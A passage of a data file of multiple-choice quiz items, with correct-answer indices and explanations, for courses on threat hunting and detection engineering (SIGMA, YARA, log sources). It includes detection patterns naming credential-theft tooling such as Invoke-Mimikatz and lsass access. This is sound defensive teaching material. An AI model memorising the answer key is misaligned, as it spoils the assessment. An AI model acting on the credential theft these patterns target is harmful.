                  "Cert-based hunting: rank destinations by (self-signed OR default CN 'localhost'/'kubernetes'/'example') AND short validity AND rare issuer AND non-web JA3S — a strong C2/redteam-tool signal, especially when combined with beaconing behavior",
                  "Only flag expired certs",
                  "Ignore certs — TLS is opaque"
              ],
              correctAnswer: 1,
              explanation: "Cert metadata is visible even under TLS 1.3 (SNI + cert seen in handshake). Combining cert anomalies with JA3/JA3S and beaconing cadence is one of the highest-fidelity network C2 hunts."
          }
      ]
  },
  {
      quizId: "th-q6",
      courseId: "threat-hunting",
      title: "Hunt Operations & Reporting",
      description: "Program-level operations: hunt planning, automation, metrics, executive reporting, and the hunt→detect handoff.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "th-q6-1",
              difficulty: "easy",
              tags: ["Hunt Plan"],
              scenario: "A junior hunter submits a one-line plan: 'I'll look for lateral movement this sprint.'",
              question: "What are the mandatory elements they must add before work begins?",
              options: [
                  "Just a due date",
                  "Hypothesis, ATT&CK mapping, data sources & retention, analytical technique, tools/queries, expected artifacts, success/failure criteria, and hand-off owner",
                  "Only the queries",
                  "A screenshot of the SIEM"
              ],
              correctAnswer: 1,
              explanation: "Without these, the hunt is unrepeatable, unmeasurable, and hard to hand off. Every mature program uses a hunt-plan template."
          },
          {
              id: "th-q6-2",
              difficulty: "easy",
              tags: ["Hunt → Detection"],
              scenario: "Your last four hunts each surfaced novel behavior but no detections were built afterward. This quarter's dwell time went up.",
              question: "What is the core process failure?",
              options: [
                  "Analysts are too slow",
                  "Missing hunt→detection handoff: every confirmed technique should produce a Sigma/analytic candidate with FP analysis, tuning, and ownership by detection engineering — otherwise the same gap re-opens next month",
                  "Not enough hunts",
                  "Wrong SIEM"
              ],
              correctAnswer: 1,
              explanation: "The measurable output of hunting is durable detections and coverage improvements. Without the handoff, hunting is entertainment."
          },
          {
              id: "th-q6-3",
              difficulty: "medium",
              tags: ["Tooling"],
              scenario: "Your team keeps rewriting the same enrichment code (VT lookups, WHOIS, GeoIP, ATT&CK mapping) in ad-hoc scripts every hunt.",
              question: "Which platform choice standardizes this and makes hunts reproducible?",
              options: [
                  "Excel",
                  "Jupyter notebooks with MSTICPy (or equivalent) — versioned, reproducible, shareable, with reusable enrichment/query/visualization primitives; results become the hunt artifact",
                  "Word documents",
                  "Screenshots in a wiki"
              ],
              correctAnswer: 1,
              explanation: "Notebook-based hunting turns work into reusable, auditable artifacts. MSTICPy provides pre-built connectors, enrichers, and ATT&CK helpers so hunters stop reinventing the wheel."
          },
          {
              id: "th-q6-4",
              difficulty: "medium",
              tags: ["Detection Gap"],
              scenario: "Leadership asks for one number that captures how well the program is closing blind spots.",
              question: "Which metric best proxies 'detection gap' over time?",
              options: [
                  "Number of alerts per day",
                  "ATT&CK (sub-)technique coverage — count of (sub-)techniques with at least one validated, in-production detection (ideally validated by purple-team tests), tracked as a trend line and by tactic",
                  "Number of hunts done",
                  "SIEM license utilization"
              ],
              correctAnswer: 1,
              explanation: "Validated ATT&CK coverage is the most honest single metric of 'what we can detect vs what adversaries do'. Alert counts measure noise, not capability."
          },
          {
              id: "th-q6-5",
              difficulty: "medium",
              tags: ["Executive Reporting"],
              scenario: "You must brief the CFO on last quarter's hunting.",
              question: "What belongs in the executive summary?",
              options: [
                  "Raw SPL queries and Sysmon EIDs",
                  "Business-impact findings, risk reduced (with dollar or downtime proxies), new detections added, coverage delta on ATT&CK, top three residual risks, and asks for the next quarter",
                  "Screenshots of dashboards",
                  "A list of every alert"
              ],
              correctAnswer: 1,
              explanation: "Executives need decisions, not queries. Translate technical findings into risk, coverage, and investment asks."
          },
          {
              id: "th-q6-6",
              difficulty: "medium",
              tags: ["Program Metrics"],
              scenario: "Your KPI dashboard tracks only 'hours worked' and 'hunts opened'.",
              question: "Which balanced metric set actually reflects program value?",
              options: [
                  "Just add ticket counts",
                  "Hunts completed, unique findings, detections shipped, ATT&CK coverage delta, MTTD/MTTR improvement, and false-positive rate of shipped detections — outcome + quality, not just activity",
                  "Only track findings",
                  "Only track hours"
              ],
              correctAnswer: 1,
              explanation: "Activity metrics (hours, count) are gameable. Outcome + quality metrics (coverage, MTTD, FP rate of new detections) resist gaming and drive real improvement."
          },
          {
              id: "th-q6-7",
              difficulty: "medium",
              tags: ["Backlog"],
              scenario: "New CTI drops weekly, incidents produce follow-ups, and a data scientist keeps pitching analytics ideas. Everyone is stepping on each other.",
              question: "How should the hunt backlog be managed?",
              options: [
                  "First-come-first-served",
                  "A single ranked backlog scored on threat-to-org relevance × likelihood × detection-gap × feasibility, groomed weekly; every entry has a template hypothesis and an owner, and completed hunts feed back into scoring",
                  "Do whatever the loudest person says",
                  "No backlog needed"
              ],
              correctAnswer: 1,
              explanation: "A scored, groomed backlog stops the program from being reactive and ensures the highest-value hunts run first. Feedback loops keep scoring honest."
          },
          {
              id: "th-q6-8",
              difficulty: "hard",
              tags: ["IOC Sharing"],
              scenario: "During a confirmed intrusion you extract 12 IOCs and 3 novel TTPs. Legal has authorized TLP:AMBER sharing with your sector ISAC.",
              question: "What is the right sharing timing and format?",
              options: [
                  "Sit on it for 90 days",
                  "Immediately: internal SOC/IR/detection engineering for blocking and hunting; ISAC/MISP for peers, packaged with ATT&CK mapping, YARA/Sigma, TLP marking, and confidence — with victim-identifying detail redacted",
                  "Only after full RCA",
                  "Never share"
              ],
              correctAnswer: 1,
              explanation: "Speed matters — adversaries reuse infrastructure and TTPs across victims for hours to weeks. Structured sharing with proper TLP protects the source while enabling collective defense."
          },
          {
              id: "th-q6-9",
              difficulty: "hard",
              tags: ["ATT&CK Coverage"],
              scenario: "Your ATT&CK Navigator layer shows 61% technique coverage. A peer org claims 92%.",
              question: "What is the correct skeptical read?",
              options: [
                  "You're losing — buy more tools",
                  "Coverage percentages are meaningless without: (a) which sub-techniques and platforms are counted, (b) whether detections are validated (purple team / atomic tests), (c) FP-tuned and in production, (d) matched to your threat model — compare methodology first, numbers second",
                  "92% is impossible",
                  "Coverage doesn't matter"
              ],
              correctAnswer: 1,
              explanation: "ATT&CK coverage is trivially inflated by counting untested rules. Meaningful coverage is validated, tuned, and threat-model-relevant. Compare methodology before numbers."
          },
          {
              id: "th-q6-10",
              difficulty: "hard",
              tags: ["Hunting ↔ Detection Engineering"],
              scenario: "Leadership asks whether hunting and detection engineering should be merged into one team to 'save cost'.",
              question: "What is the strongest argument for keeping them distinct but tightly coupled?",
              options: [
                  "They do the same thing — merge",
                  "They are complementary halves of a loop: hunting explores unknowns and produces novel signal; detection engineering hardens known signal into production analytics with SLAs, tuning, and lifecycle — merging risks either killing exploration under alert-backlog pressure or shipping untuned analytics; separate charters + shared backlog + KPIs on the handoff preserves both",
                  "Only hunting matters",
                  "Only detection engineering matters"
              ],
              correctAnswer: 1,
              explanation: "The two functions have different tempos, KPIs, and risk profiles. Coupling via shared backlog and explicit handoff SLAs beats structural merging."
          }
      ]
  },
  // ===================== Detection Engineering Basics =====================
  {
    quizId: "de-q1",
    courseId: "detection-engineering",
    title: "Detection Fundamentals",
    description: "Scenario-based mastery of detection philosophy, coverage models, and alert quality.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "de-q1-1",
        difficulty: "easy",
        tags: ["Detection Spectrum", "Pyramid of Pain"],
        scenario: "Leadership asks why last quarter's shiny new hash-block feed stopped catching the same actor within a week, while your Sysmon behavior rule for 'lsass access from non-Microsoft binary' has fired against three unrelated intrusions in six months.",
        question: "Which detection type is the most durable investment?",
        options: [
          "Hash-based signatures — precise and easy to share",
          "Behavior/anomaly detections on TTPs — attackers pay a real cost to change tradecraft, while IOCs rotate hourly",
          "Static string signatures in binaries",
          "Pure IP/domain blocklists"
        ],
        correctAnswer: 1,
        explanation: "Pyramid of Pain: TTPs and behaviors sit at the top — costly and slow to change. Hashes and IPs are trivially rotated."
      },
      {
        id: "de-q1-2",
        difficulty: "easy",
        tags: ["Assume Breach"],
        scenario: "A VP argues detection engineering is a waste because 'the EDR and firewall already block everything'.",
        question: "How do you frame the 'assume breach' counter-argument?",
        options: [
          "Preventive controls always fail eventually; detections validate that controls work and catch the residual — you cannot manage what you cannot see",
          "Agree and disband the team",
          "Buy more preventive tools",
          "Only monitor the perimeter"
        ],
        correctAnswer: 0,
        explanation: "Assume-breach assumes prevention will fail at some layer; detections continuously test controls and provide the signal to respond."
      },
      {
        id: "de-q1-3",
        difficulty: "medium",
        tags: ["Alert Quality", "FP Rate"],
        scenario: "A new rule fires 400 times a day; ~380 are benign admin activity. Analysts start auto-closing everything tagged with that rule name within 72 hours.",
        question: "What is the correct fidelity target and immediate action?",
        options: [
          "Leave it — volume proves coverage",
          "High-fidelity alerting rules should sit below ~5% FP; tune, add exclusions, or downgrade to a hunt/audit stream before the rule name becomes untrusted",
          "Raise severity to force attention",
          "Silence the rule permanently"
        ],
        correctAnswer: 1,
        explanation: "Alert fatigue destroys trust. Rules over the FP budget must be tuned, split, or demoted to lower-tier telemetry — never left noisy."
      },
      {
        id: "de-q1-4",
        difficulty: "medium",
        tags: ["Detection-as-Product"],
        scenario: "Your team ships rules from analyst laptops directly to prod. There is no changelog, no owner, and no test — the same 'PowerShell EncodedCommand' rule exists in three copies with different logic.",
        question: "What does 'detection as a product' actually require?",
        options: [
          "Nothing changes — just document more",
          "Requirements → design → peer review → tests (unit + atomic) → CI/CD deploy → owner + SLA + tuning cadence + retirement criteria, all under version control",
          "Buy vendor rules only",
          "Let each analyst own their own rules"
        ],
        correctAnswer: 1,
        explanation: "Detection-as-product borrows SWE discipline: versioning, review, tests, owners, and lifecycle — not one-off scripts."
      },
      {
        id: "de-q1-5",
        difficulty: "medium",
        tags: ["Prerequisite Data"],
        scenario: "A team lead demands a T1055 (Process Injection) detection by Friday. Sysmon is deployed but Event IDs 8 and 10 are excluded in config; EDR API access is not funded.",
        question: "What is the correct first move?",
        options: [
          "Write the rule anyway; ship silent",
          "Stop — no telemetry = no detection. Fix the data gap first (enable Sysmon 8/10 or fund EDR), then design the analytic; document the visibility gap and its ATT&CK coverage impact",
          "Approximate with successful logon events",
          "Buy a threat intel feed"
        ],
        correctAnswer: 1,
        explanation: "Rules without underlying telemetry are theatre. Fix or acknowledge the visibility gap before writing the analytic."
      },
      {
        id: "de-q1-6",
        difficulty: "medium",
        tags: ["Coverage Model"],
        scenario: "Your CISO wants a single slide showing where you can and cannot detect adversary behavior.",
        question: "Which framework and artifact answers this best?",
        options: [
          "NIST CSF maturity radar",
          "MITRE ATT&CK Navigator layer showing validated + tuned detections per (sub-)technique, colored by confidence, filtered to your threat model",
          "PCI DSS checklist",
          "OWASP Top 10"
        ],
        correctAnswer: 1,
        explanation: "ATT&CK Navigator is the industry-standard coverage artifact — but only meaningful when limited to validated, tuned, threat-relevant detections."
      },
      {
        id: "de-q1-7",
        difficulty: "medium",
        tags: ["Noisy Rule Policy"],
        scenario: "A production rule generated >5 FPs/day for five consecutive days. It has an owner but no tuning has occurred.",
        question: "What does a healthy noisy-rule policy do?",
        options: [
          "Wait a quarter and revisit",
          "Auto-disable (or move to audit-only) on breach of the FP budget, open a tuning ticket to the owner with SLA, and require re-validation before re-enable",
          "Delete the rule silently",
          "Ignore — analysts will learn"
        ],
        correctAnswer: 1,
        explanation: "Policy-driven auto-suppression protects analyst trust and forces the owner to rework or retire the rule."
      },
      {
        id: "de-q1-8",
        difficulty: "hard",
        tags: ["Precision vs Recall"],
        scenario: "You must choose between (A) a broad rule catching 95% of variants with 30% FP, or (B) a narrow rule catching 60% with 2% FP, both for the same T-code. Response tier is Tier 1 with SOAR auto-triage.",
        question: "What is the right pattern?",
        options: [
          "Only ship A",
          "Ship both in layers: B as high-fidelity alerting; A as low-fidelity hunt/audit stream feeding enrichment and periodic review — never rely on one rule for one technique",
          "Only ship B",
          "Merge into one medium rule"
        ],
        correctAnswer: 1,
        explanation: "Layered detections trade precision and recall across tiers instead of forcing one rule to do both jobs."
      },
      {
        id: "de-q1-9",
        difficulty: "hard",
        tags: ["Validation"],
        scenario: "Your ATT&CK layer shows 74% coverage. A red team runs Atomic Red Team on 40 techniques you claim to cover; only 22 alert.",
        question: "What is the honest read?",
        options: [
          "Coverage is fine on paper",
          "Untested coverage is fiction — recompute the layer to only count detections that pass current atomic/purple-team validation, and treat the delta as a program KPI",
          "Blame the red team",
          "Delete the failing rules"
        ],
        correctAnswer: 1,
        explanation: "Coverage without continuous validation is a vanity metric. Validated coverage is the number that matters."
      },
      {
        id: "de-q1-10",
        difficulty: "hard",
        tags: ["Lifecycle"],
        scenario: "You are drafting the team's SDLC for detections.",
        question: "What is the correct end-to-end lifecycle?",
        options: [
          "Write → ship → forget",
          "Requirements (threat + data) → design → develop → test (unit, atomic, purple) → deploy via CI/CD → operate (tune, own, SLA) → retire (superseded, obsolete, or ineffective)",
          "Buy → deploy → audit yearly",
          "Alert → investigate → close"
        ],
        correctAnswer: 1,
        explanation: "A real detection SDLC covers cradle-to-grave, including deliberate retirement — rules that never die become tech debt."
      }
    ]
  },
  {
    quizId: "de-q2",
    courseId: "detection-engineering",
    title: "SIGMA Rules",
    description: "Scenario-based knowledge of SIGMA syntax, modifiers, conversion, and portability.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "de-q2-1",
        difficulty: "easy",
        tags: ["SIGMA Basics"],
        scenario: "Your org runs Splunk in HQ, Elastic in EU, and Sentinel in the cloud tenant. Leadership wants one detection language shared across all three.",
        question: "Why is SIGMA the right authoring layer?",
        options: [
          "SIGMA is a vendor-neutral YAML format that compiles to Splunk SPL, Elastic KQL/EQL, and KQL — you author once, convert per backend",
          "SIGMA runs on the endpoint",
          "SIGMA replaces the SIEM engine",
          "SIGMA is an EDR agent"
        ],
        correctAnswer: 0,
        explanation: "SIGMA is a portable authoring format. Backends (sigmac / pysigma) translate to the target SIEM query language."
      },
      {
        id: "de-q2-2",
        difficulty: "easy",
        tags: ["logsource"],
        scenario: "You paste a rule with `logsource: { category: process_creation, product: windows }` but it converts to a Sysmon query in one env and to Security 4688 in another.",
        question: "What is the role of logsource?",
        options: [
          "Cosmetic",
          "It declares the abstract event class; backend field-mapping config translates it to the correct data source and field names per environment",
          "It fixes the raw index name",
          "It is only documentation"
        ],
        correctAnswer: 1,
        explanation: "logsource is the abstract contract; the backend + field mapping decides which product/index/fields fulfil it (Sysmon 1 vs Security 4688)."
      },
      {
        id: "de-q2-3",
        difficulty: "medium",
        tags: ["Modifiers"],
        scenario: "You want to match any Image path ending in `\\powershell.exe` OR `\\pwsh.exe`, case-insensitively.",
        question: "Which SIGMA construction is correct?",
        options: [
          "Regex only",
          "`Image|endswith:` with a YAML list of both values — a list under one field is implicit OR, and `endswith` is case-insensitive by default",
          "`Image|all:` with the list",
          "`Image|startswith:` with the list"
        ],
        correctAnswer: 1,
        explanation: "Lists imply OR; `|endswith` handles the suffix match cleanly. `|all` would require both suffixes on the same value (impossible)."
      },
      {
        id: "de-q2-4",
        difficulty: "medium",
        tags: ["Condition Logic"],
        scenario: "Your detection has three selection blocks: `selection_proc`, `selection_cmd`, `filter_signed`. You want proc AND cmd, minus signed binaries.",
        question: "Which condition line implements that?",
        options: [
          "`selection_proc or selection_cmd`",
          "`all of selection_*`",
          "`selection_proc and selection_cmd and not filter_signed`",
          "`1 of selection_*`"
        ],
        correctAnswer: 2,
        explanation: "Explicit boolean logic gives precise control. `all of` would incorrectly include the filter as a required match."
      },
      {
        id: "de-q2-5",
        difficulty: "medium",
        tags: ["False Positives Field"],
        scenario: "A reviewer rejects your rule because the `falsepositives` field says 'None known'. You've never tested it in a real environment.",
        question: "Why does the reviewer care?",
        options: [
          "SIGMA won't compile",
          "'None known' is a red flag — the field must list plausible benign causes (admin tooling, backup agents, MECM) so downstream teams can pre-tune before deploy",
          "It affects performance",
          "It changes severity"
        ],
        correctAnswer: 1,
        explanation: "`falsepositives` is a contract with downstream users. Empty or 'None' signals untested, un-tuned detections."
      },
      {
        id: "de-q2-6",
        difficulty: "medium",
        tags: ["Portability Pitfalls"],
        scenario: "Your rule uses `CommandLine|contains: 'Invoke-Mimikatz'`. It fires in Splunk but not in Sentinel.",
        question: "What is the most common cause?",
        options: [
          "Sentinel is broken",
          "Field mapping mismatch — Sentinel may expose the command line under `ProcessCommandLine` (DeviceProcessEvents) rather than `CommandLine`; the backend config must map the SIGMA field to the vendor field",
          "Case sensitivity of YAML",
          "The rule needs to be recompiled hourly"
        ],
        correctAnswer: 1,
        explanation: "Portability lives or dies on field mappings. Fix the pysigma pipeline, not the rule."
      },
      {
        id: "de-q2-7",
        difficulty: "hard",
        tags: ["Rule Correlation"],
        scenario: "You need to alert only when a suspicious child process spawns from Word AND a network connection follows from the child within 30 seconds.",
        question: "How do you express this in modern SIGMA?",
        options: [
          "One flat selection block",
          "Two rules chained via a SIGMA correlation rule (type: temporal) with a timespan and grouping (e.g., by host + parent PID)",
          "Regex on the command line",
          "SIGMA does not support correlation"
        ],
        correctAnswer: 1,
        explanation: "SIGMA now supports correlation rules (event_count, value_count, temporal). Use temporal with grouping keys and a timespan."
      },
      {
        id: "de-q2-8",
        difficulty: "hard",
        tags: ["Pipeline Modifiers"],
        scenario: "You must ship one SIGMA rule for Windows Sysmon and a second for Windows Security 4688 without maintaining two YAML files.",
        question: "How do you achieve this?",
        options: [
          "Copy the YAML twice",
          "Author once against abstract logsource; use pysigma processing pipelines to emit backend-specific queries per data source (Sysmon vs Security), including field renames and value transforms",
          "Use two rule engines",
          "SIGMA cannot handle both"
        ],
        correctAnswer: 1,
        explanation: "Processing pipelines let one abstract rule fan out to multiple data sources without duplicating YAML."
      },
      {
        id: "de-q2-9",
        difficulty: "hard",
        tags: ["Community Rule Hygiene"],
        scenario: "You import 900 community SIGMA rules straight into prod. Alert volume 10x's overnight and the SOC revolts.",
        question: "What was the missing step?",
        options: [
          "Community rules must be treated as candidates: filter by level, map to your telemetry, test in shadow/audit mode, tune with local filters, then promote per your normal lifecycle",
          "Delete all community rules",
          "Raise severity thresholds only",
          "Turn off SIGMA"
        ],
        correctAnswer: 0,
        explanation: "Community rules are drafts for your environment — you own tuning, testing, and promotion."
      },
      {
        id: "de-q2-10",
        difficulty: "hard",
        tags: ["Governance"],
        scenario: "Auditors ask how you know a rule in prod matches the reviewed YAML.",
        question: "What is the defensible answer?",
        options: [
          "Trust the analyst",
          "Rules live in Git; CI/CD converts + deploys with a signed commit hash; the deployed query in the SIEM carries the rule ID and commit hash in metadata so any drift is detectable",
          "Screenshots in a wiki",
          "Manual annual review"
        ],
        correctAnswer: 1,
        explanation: "Traceability from Git commit to deployed query is the audit-defensible model; drift detection is a first-class concern."
      }
    ]
  },
  {
    quizId: "de-q3",
    courseId: "detection-engineering",
    title: "YARA Signatures",
    description: "Scenario-based YARA authorship: strings, hex, conditions, and operational deployment.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "de-q3-1",
        difficulty: "easy",
        tags: ["Use Case"],
        scenario: "IR pulls a memory image and 12,000 dropped files from a compromised host and needs to know which are malicious.",
        question: "What is YARA's primary role here?",
        options: [
          "Network IDS",
          "Pattern-based scanning of files, processes, and memory using strings, hex, and boolean conditions to classify and family-attribute samples",
          "Log parsing",
          "Endpoint policy enforcement"
        ],
        correctAnswer: 1,
        explanation: "YARA is the standard tool for classifying files and memory against known family signatures during triage and hunts."
      },
      {
        id: "de-q3-2",
        difficulty: "easy",
        tags: ["Rule Structure"],
        scenario: "A junior analyst writes a rule with only `strings:` and no `condition:` — it won't compile.",
        question: "What are the mandatory sections of a YARA rule?",
        options: [
          "Only strings",
          "`rule` name + `condition` — strings/meta are optional but condition is required and defines the boolean match",
          "meta only",
          "imports only"
        ],
        correctAnswer: 1,
        explanation: "`condition` is the required decision logic. `strings` and `meta` are optional; imports enable modules."
      },
      {
        id: "de-q3-3",
        difficulty: "medium",
        tags: ["String Types"],
        scenario: "You need to match a variable-length attacker banner that starts with `MZ`, contains an arbitrary 2–8 byte gap, then ends with `Kernel32.dll`.",
        question: "Which string form fits best?",
        options: [
          "Plain text string",
          "Hex string with a jump like `4D 5A [2-8] 4B 65 72 6E 65 6C 33 32 2E 64 6C 6C`",
          "Regex only",
          "wide + ascii text"
        ],
        correctAnswer: 1,
        explanation: "Hex strings with jumps `[a-b]` handle variable-length gaps that plain strings cannot express cleanly."
      },
      {
        id: "de-q3-4",
        difficulty: "medium",
        tags: ["Modifiers"],
        scenario: "Your rule for a PowerShell dropper misses samples where strings are UTF-16 (as in .NET) and hits nothing when strings are lowercased.",
        question: "Which modifier combination fixes both?",
        options: [
          "`nocase`",
          "`wide ascii nocase` on the string — matches both encodings and case variants",
          "`fullword` only",
          "`base64` only"
        ],
        correctAnswer: 1,
        explanation: "`wide` covers UTF-16, `ascii` keeps single-byte matches, `nocase` handles case; combine as needed."
      },
      {
        id: "de-q3-5",
        difficulty: "medium",
        tags: ["Condition Logic"],
        scenario: "You want the rule to fire only if at least 3 of your 8 unique strings are present AND the file is a PE.",
        question: "Which condition is correct?",
        options: [
          "`any of them`",
          "`3 of ($s*) and uint16(0) == 0x5A4D`",
          "`all of them`",
          "`filesize < 1MB`"
        ],
        correctAnswer: 1,
        explanation: "`N of ($s*)` gives the k-of-n logic; the MZ magic check confirms PE. Boolean AND ties them."
      },
      {
        id: "de-q3-6",
        difficulty: "medium",
        tags: ["Performance"],
        scenario: "A rule with three short 2-byte strings and a broad regex runs against 50M files and drags the fleet.",
        question: "What is the performance guidance?",
        options: [
          "Add more strings",
          "Prefer long (≥4 byte) anchored strings, avoid unbounded regex, gate expensive checks behind cheap ones (e.g., magic bytes / filesize) in the condition — order matters",
          "Run against memory only",
          "Increase timeout"
        ],
        correctAnswer: 1,
        explanation: "Short strings and greedy regex explode search space. Cheap gates first, expensive checks second is the standard optimization."
      },
      {
        id: "de-q3-7",
        difficulty: "hard",
        tags: ["PE Module"],
        scenario: "You want to detect a family by imphash and by a specific export name, without depending on strings.",
        question: "How do you express this?",
        options: [
          "Strings only",
          "`import \"pe\"` then in condition: `pe.imphash() == \"...\" or pe.exports(\"DllRegisterServer\")`",
          "Regex on the raw bytes",
          "YARA cannot inspect PE metadata"
        ],
        correctAnswer: 1,
        explanation: "The `pe` module exposes imphash, exports, sections, resources — invaluable for family-level detections."
      },
      {
        id: "de-q3-8",
        difficulty: "hard",
        tags: ["Memory Scanning"],
        scenario: "You need to detect an in-memory Cobalt Strike beacon whose on-disk loader is unique per victim.",
        question: "What is the right approach?",
        options: [
          "Scan disk only",
          "Author process-memory YARA against beacon config structures (e.g., known static struct offsets, magic constants) and run via EDR/live-response — memory reveals what disk hides",
          "Rely on hash blocking",
          "Turn off scanning"
        ],
        correctAnswer: 1,
        explanation: "Fileless / reflectively-loaded implants only exist in memory. Memory YARA (via EDR, Volatility, or agent) is the correct plane."
      },
      {
        id: "de-q3-9",
        difficulty: "hard",
        tags: ["Rule Hygiene"],
        scenario: "A shared YARA repo has 2,500 rules; ~40% never match anything; another 5% match every OS binary.",
        question: "What does healthy rule lifecycle look like?",
        options: [
          "Ship everything",
          "Track per-rule hit and FP telemetry; require `meta:` with author, reference, date, hash, and TLP; retire stale rules and quarantine noisy ones with the same discipline as SIEM detections",
          "Delete the repo",
          "Freeze all rules"
        ],
        correctAnswer: 1,
        explanation: "YARA rules are code and deserve the same telemetry, review, and retirement discipline as SIEM detections."
      },
      {
        id: "de-q3-10",
        difficulty: "hard",
        tags: ["Deployment"],
        scenario: "You want the same YARA ruleset scanning uploads at the mail gateway, files at the endpoint, and memory of running processes.",
        question: "What is the correct operational model?",
        options: [
          "Different rules per plane",
          "Author once; tag rules with intended scan surface (`disk`, `memory`, `mail`) and version them in Git; distribution pipeline pushes the right subset to each engine (EDR, ICAP proxy, mail gateway) with performance-appropriate tuning",
          "Only scan endpoints",
          "Only scan mail"
        ],
        correctAnswer: 1,
        explanation: "One source of truth with tag-based fan-out avoids drift and keeps engines aligned."
      }
    ]
  },
  {
    quizId: "de-q4",
    courseId: "detection-engineering",
    title: "Log Source Mastery",
    description: "Scenario-based knowledge of Windows, Linux, network, and cloud telemetry.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "de-q4-1",
        difficulty: "easy",
        tags: ["Windows Process Creation"],
        scenario: "Your Windows Security channel logs 4688 without command line. You need parent + child + command line + hashes for a T1059 detection.",
        question: "What is the standard fix?",
        options: [
          "Enable 'Include command line' via GPO — but Sysmon Event ID 1 gives richer fields (ParentImage, CommandLine, Hashes, IntegrityLevel, User) and is the preferred source",
          "Rely on 4688 as-is",
          "Turn off Sysmon",
          "Use Application log"
        ],
        correctAnswer: 0,
        explanation: "4688 with command-line auditing is a floor; Sysmon 1 is the ceiling and the industry standard for process creation."
      },
      {
        id: "de-q4-2",
        difficulty: "easy",
        tags: ["Sysmon"],
        scenario: "You inherit a Sysmon deployment using the default config. Coverage looks great on paper but hunts miss image loads and DNS.",
        question: "What is the root cause?",
        options: [
          "Sysmon can't log DNS",
          "The default config is minimal — production deployments use a curated config (e.g., SwiftOnSecurity / Olaf Hartong) tuned to enable EIDs like 7 (ImageLoad), 22 (DNS), 8/10 (injection) with exclusions",
          "GPO must be reapplied",
          "Sysmon needs re-installing"
        ],
        correctAnswer: 1,
        explanation: "Sysmon's power lives in its config; without a curated, tuned config you're logging almost nothing useful."
      },
      {
        id: "de-q4-3",
        difficulty: "medium",
        tags: ["Linux auditd"],
        scenario: "You need to detect a reverse shell child of sshd on Linux servers.",
        question: "Which telemetry stack is standard and what do you need?",
        options: [
          "syslog only",
          "auditd (or auditbeat / eBPF-based agents like Falco / Elastic Defend) with rules on `execve` and parent tracking — capture uid, ppid, comm, exe, and command args",
          "netstat cron",
          "dmesg"
        ],
        correctAnswer: 1,
        explanation: "auditd/eBPF is the Linux equivalent of Sysmon; execve + parent chain is the analog of Windows process creation."
      },
      {
        id: "de-q4-4",
        difficulty: "medium",
        tags: ["Network"],
        scenario: "Your NDR sees encrypted TLS 1.3 to a rare domain from a workstation and you want a rule.",
        question: "Which artifact set is most useful?",
        options: [
          "Payload strings",
          "Zeek / Suricata metadata: SNI, JA3/JA3S, JA4, cert issuer, ASN, first-seen domain age, beacon interval — behavior over payload",
          "Full packet payload",
          "DHCP leases"
        ],
        correctAnswer: 1,
        explanation: "Encrypted traffic forces analytics onto metadata; JA3/JA4, SNI, cert, and timing carry the signal."
      },
      {
        id: "de-q4-5",
        difficulty: "medium",
        tags: ["DNS"],
        scenario: "You need to detect DNS tunneling and DGA C2 from workstations that only resolve via corporate resolvers.",
        question: "Which log path is best?",
        options: [
          "Endpoint hosts file",
          "Resolver query logs (Windows DNS Analytical, BIND query log, Cloud DNS logs) with query type, name, response code, and requester — enables entropy, length, NXDOMAIN, and TXT-volume analytics",
          "Only egress firewall port 53 counts",
          "TCP SYN logs"
        ],
        correctAnswer: 1,
        explanation: "Resolver logs are the authoritative DNS telemetry; endpoint-only visibility misses cached and forwarded queries."
      },
      {
        id: "de-q4-6",
        difficulty: "medium",
        tags: ["Cloud Control Plane"],
        scenario: "An IAM user's access key is used from a new country to enumerate S3 buckets and create a new IAM user.",
        question: "Which log source detects this end-to-end?",
        options: [
          "VPC Flow Logs only",
          "AWS CloudTrail (management events) — captures API calls, source IP, user agent, principal, and MFA context across the account",
          "S3 access logs only",
          "GuardDuty only"
        ],
        correctAnswer: 1,
        explanation: "CloudTrail is the control-plane audit log; VPC flow / S3 access logs cover data plane and are complementary."
      },
      {
        id: "de-q4-7",
        difficulty: "hard",
        tags: ["Identity"],
        scenario: "You must catch OAuth consent phishing and illicit app grants in Microsoft 365.",
        question: "Which logs and events matter most?",
        options: [
          "Mailbox audit only",
          "Entra ID (Azure AD) sign-in and audit logs + M365 Unified Audit Log — specifically `Consent to application`, `Add service principal`, `Add app role assignment` — plus MailItemsAccessed for post-consent exfil",
          "Sysmon on Exchange",
          "Firewall logs"
        ],
        correctAnswer: 1,
        explanation: "OAuth abuse lives in the identity plane, not the mailbox. Consent and service principal events are the tell."
      },
      {
        id: "de-q4-8",
        difficulty: "hard",
        tags: ["Kubernetes"],
        scenario: "You need to detect a pod exec into a production namespace by a service account.",
        question: "Which telemetry is authoritative?",
        options: [
          "Container stdout",
          "Kubernetes API audit logs (`pods/exec` verb) plus workload runtime telemetry (Falco / eBPF) for the in-container execve — control plane + runtime together",
          "Node dmesg",
          "kube-proxy iptables"
        ],
        correctAnswer: 1,
        explanation: "K8s audit logs record the API intent; runtime agents confirm what actually executed inside the container."
      },
      {
        id: "de-q4-9",
        difficulty: "hard",
        tags: ["Normalization"],
        scenario: "Your team maintains 40 unique parsers, and the same field (user) appears as `user`, `usr`, `AccountName`, `subject.user.name` across sources.",
        question: "What is the correct fix?",
        options: [
          "Rename in every rule",
          "Adopt a common schema (ECS, OCSF, or vendor CIM) at ingest so detections query normalized fields; ownership of parsers and schema is a first-class detection-engineering concern",
          "Force all sources to change field names",
          "Only use raw logs"
        ],
        correctAnswer: 1,
        explanation: "Detections at scale require a shared schema (ECS/OCSF/CIM). Normalization is not optional infrastructure."
      },
      {
        id: "de-q4-10",
        difficulty: "hard",
        tags: ["Data Quality"],
        scenario: "A weekend patch drops Sysmon event volume 60%. No alerts changed.",
        question: "What detection-engineering practice would have caught this before Monday?",
        options: [
          "Nothing — that's IT's job",
          "Data-source health monitoring: per-source EPS baselines with anomaly alerts on drops, heartbeat detections (canary events), and dashboards owned by the detection team",
          "Add more rules",
          "Wait for an incident"
        ],
        correctAnswer: 1,
        explanation: "Silent telemetry failure is one of the most damaging failure modes. Detection teams must own data-source health."
      }
    ]
  },
  {
    quizId: "de-q5",
    courseId: "detection-engineering",
    title: "Detection-as-Code",
    description: "Scenario-based version control, CI/CD, and testing for detections.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
